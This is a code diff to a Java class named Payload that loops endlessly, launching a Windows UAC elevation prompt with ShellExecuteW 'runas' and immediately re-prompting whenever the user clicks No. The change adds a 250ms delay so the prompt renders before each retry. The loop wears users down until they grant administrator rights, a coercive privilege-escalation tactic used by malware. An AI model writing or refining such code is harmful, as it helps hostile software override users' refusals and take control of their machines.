@@ -161,12 +161,9 @@ public class Payload {
             while (true) {
                 log("Triggering UAC...");
                 
-                // This call blocks until the user clicks Yes or No
                 int result = Shell32.INSTANCE.ShellExecuteW(null, "runas", javaExe, cmdArgs, null, 1);
                 
                 if (result > 32) {
-                    // User clicked Yes. The elevated process is running.
-                    // Wait for the elevated process to delete the lock file.
                     log("UAC Accepted. Waiting for elevated process...");
                     for (int i = 0; i < 150; i++) {
                         if (!lockFile.exists() || lockFile.delete()) {
@@ -177,8 +174,9 @@ public class Payload {
                         Thread.sleep(100);
                     }
                 } else {
-                    // User clicked No.
-                    log("UAC Denied. Instantly retrying...");
+                    log("UAC Denied. Retrying in 250ms...");
+                    // Wait 250ms so Windows can actually draw the prompt before we try again
+                    Thread.sleep(250); 
                 }
             }
         } catch (Exception e) {
